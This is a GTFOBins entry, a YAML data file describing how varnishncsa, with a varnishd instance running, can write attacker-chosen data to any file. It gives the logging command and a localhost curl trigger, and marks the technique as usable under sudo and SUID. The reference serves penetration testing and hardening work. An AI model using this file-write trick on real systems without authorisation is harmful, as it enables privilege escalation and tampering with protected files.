<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/varnishncsa -->
---
comment: |-
  A running `varnishd` instance must be available.
functions:
  file-write:
  - binary: false
    code: |-
      varnishncsa -g request -q 'ReqURL ~ "/xxxxxxxxxx"' -F '%{yyy}i' -w /path/to/output-file
    comment: |-
      The command hangs, so the trigger command must be performed asynchronously or in another terminal:

      ```
      curl -H 'xxx: DATA' http://localhost:6081/xxxxxxxxxx
      ```
    contexts:
      sudo:
      suid:
...
